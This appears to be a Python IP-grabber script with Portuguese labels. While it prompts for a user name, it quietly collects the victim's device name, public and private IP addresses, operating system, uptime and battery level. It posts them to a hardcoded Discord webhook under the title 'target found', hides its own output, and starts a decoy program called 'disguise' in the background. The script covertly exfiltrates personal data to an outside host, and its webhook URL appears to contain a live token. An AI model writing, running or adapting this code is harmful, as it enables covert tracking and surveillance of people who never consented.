#!/usr/bin/env python3
import sys, os, subprocess, json, requests, threading, socket, time, platform
from datetime import datetime

ORIGINAL_STDOUT = sys.stdout
ORIGINAL_STDERR = sys.stderr

WEBHOOK_URL = "https://discord.com/api/webhooks/1526978227778621652/nGwL70iXwLfDFqo7z36ITiUubF-Jr_iBGS908bWrMIkHS2VQnvpoxMLDBVBZOKEn6eHy"
DISFARCE = "python koko.py"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "Nao disponivel"

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org', timeout=5)
        if r.status_code == 200:
            return r.text
    except:
        pass
    try:
        r = requests.get('https://ifconfig.me/ip', timeout=5)
        if r.status_code == 200:
            return r.text.strip()
    except:
        pass
    return "Nao disponivel"

def get_device_name():
    try:
        return os.uname().nodename
    except:
        return "Dispositivo"

def get_system_info():
    try:
        return platform.system() + " " + platform.release()
    except:
        return "Desconhecido"

def get_uptime():
    try:
        if sys.platform == "win32":
            return "Nao disponivel"
        with open("/proc/uptime", "r") as f:
            seconds = int(float(f.read().split()[0]))
            days = seconds // 86400
            hours = (seconds % 86400) // 3600
            minutes = (seconds % 3600) // 60
            return f"{days}d {hours}h {minutes}m"
    except:
        return "Nao disponivel"

def get_battery():
    try:
        if sys.platform == "win32":
            return "Nao disponivel"
        if os.path.exists("/sys/class/power_supply/battery/capacity"):
            with open("/sys/class/power_supply/battery/capacity", "r") as f:
                cap = f.read().strip()
            with open("/sys/class/power_supply/battery/status", "r") as f:
                status = f.read().strip()
            return f"{cap}% ({status})"
        if os.path.exists("/data/data/com.termux/files/usr/bin/termux-battery-status"):
            out = subprocess.check_output("termux-battery-status", shell=True, timeout=5)
            data = json.loads(out)
            return f"{data.get('percentage', '?')}% ({data.get('status', '?')})"
        return "Nao disponivel"
    except:
        return "Nao disponivel"

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Nao disponivel"

def send_webhook_embed(nome, dispositivo, ip_publico, ip_privado, sistema, uptime, bateria, local_ip):
    if not WEBHOOK_URL or "SEU_WEBHOOK" in WEBHOOK_URL:
        return
    embed = {
        "embeds": [{
            "title": "🎯 ALVO ENCONTRADO",
            "color": 0x00ff00,
            "fields": [
                {"name": "👤 Nome", "value": nome, "inline": True},
                {"name": "💻 Dispositivo", "value": dispositivo, "inline": True},
                {"name": "🖥️ Sistema", "value": sistema, "inline": True},
                {"name": "🌐 IP Público", "value": ip_publico, "inline": False},
                {"name": "🔒 IP Privado", "value": ip_privado, "inline": True},
                {"name": "📡 IP Local", "value": local_ip, "inline": True},
                {"name": "🔋 Bateria", "value": bateria, "inline": True},
                {"name": "⏱️ Uptime", "value": uptime, "inline": True},
                {"name": "🕐 Horário", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False}
            ],
            "footer": {"text": "Sistema de Monitoramento"}
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=10)
    except:
        pass

def executar_disfarce():
    if DISFARCE:
        try:
            if os.name == 'nt':
                subprocess.Popen(DISFARCE, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen(DISFARCE, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        except Exception as e:
            pass

def main():
    sys.stdout = ORIGINAL_STDOUT
    sys.stderr = ORIGINAL_STDERR
    nome = input("user name: ").strip()
    while not nome:
        nome = input("user name: ").strip()
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    dispositivo = get_device_name()
    ip_publico = get_public_ip()
    ip_privado = get_private_ip()
    local_ip = get_local_ip()
    sistema = get_system_info()
    uptime = get_uptime()
    bateria = get_battery()

    send_webhook_embed(nome, dispositivo, ip_publico, ip_privado, sistema, uptime, bateria, local_ip)

    executar_disfarce()

    sys.stdout = ORIGINAL_STDOUT
    sys.stderr = ORIGINAL_STDERR

if __name__ == "__main__":
    main()
